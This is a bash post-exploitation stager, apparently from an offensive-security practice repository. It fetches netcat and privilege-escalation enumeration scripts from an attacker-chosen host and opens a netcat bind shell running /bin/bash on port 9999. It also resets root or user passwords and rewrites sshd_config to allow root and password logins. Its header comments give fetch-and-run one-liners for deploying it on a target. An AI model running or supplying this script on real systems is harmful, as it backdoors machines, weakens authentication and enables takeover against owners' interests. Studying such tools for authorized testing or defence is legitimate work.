#!/bin/bash
# used to stage all appropriate tools needed for privesc + handles some base config setup
# -------------------------------------------------------------------------------------------------------------------------------- 
# if the target is able to contact github, use the below one liner for the quickest method.
# cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/
#
# If the target is only able to connect back to you download, use the below
# steps: 
# 1: Host Machine:   cd /tmp/ && git clone https://github.com/WillChaos/OFFSEC.git && cd OFFSEC/PrivEsc/ && python -m SimpleHTTPServer 81
# 2: Target Machine: cd /tmp/ && wget http://<hostIP>:81/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh http://<hostIP>:81/
# ---------------------------------------------------------------------------------------------------------------------------------


if [ -z "$1" ]
  then
    echo "select file source, IE: https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/"
    echo "NOTE: make sure you include the trailing: / " 
  else

  # banner
  echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
  echo "[]_________________________________________________________________________________________[]"
  echo " Targeting file source: $1"
  echo "[]_________________________________________________________________________________________[]"
  sleep 2s
  
  # download NC
  echo "[*] Downloading NC to: /tmp/ + making executable"
  wget $1nc -O /tmp/nc && chmod +x /tmp/nc


  # download linenum.sh
  echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
  wget $1LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh


  # download LinxPrivChecker.py
  echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
  wget $1linuxprivchecker.py -O /tmp/LPC.py

  # build a NC bind shell incase we lose a shell
  echo "[*] Attempting to bind a shell to 9999 incase you lose your shell (not reliable - sometimes works)"
  /tmp/nc -nlvp 9999 -e /bin/bash &
  # chill for a sec, waits for the script to catch up (this has helped unscrample a lot of shit on semi-broken shells)
  sleep 2s
  
  # Configure ssh to allow for root logins / prep ssh for us
  echo "[*] Attempting to config SSH for relaible shell / ssh tunnel"
  if [ "$EUID" -eq 0 ]
    then
    echo "-[*] running as root - enabling SSH access for root"
    echo "-[*] resetting password: $USER : qwerty"
        sudo echo 'root:passwd' | chpasswd
    echo "-[*] configuring sshd_config to allow root logins"
        # older releases
        sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
        # newer releases 
        sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
    echo "-[*] configuring sshd_config to allow PSK auth"
        sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
        
        
      
    echo "-[!] complete."
  else
    echo "-[*] we are not running as root [$USER]"
    echo "-[*] resetting password : $USER : qwerty"
        echo "$USER:passwd" | chpasswd
    echo "-[!] complete. please be aware that if this user has been denioed SSH access, we wont be able to connect"

  fi
  echo "-[*] detecting which ports ssh is availble on"
      service sshd restart
      netstat -tpln | egrep '(Proto|ssh)'



  # semi interactive shell
  echo "[*] Attempting to build semi-interactive shell "
  echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"
  if command -v python &>/dev/null; then
      echo "-[*] Python availble, dropping semi-tty shell"
      python -c 'import pty;pty.spawn("/bin/bash");'

  elif command -v python3 &>/dev/null; then
      echo "-[*] Python 3 availble, dropping semi-tty shell"
      python3 -c 'import pty;pty.spawn("/bin/bash");' 

  else
      echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method"
  fi

fi


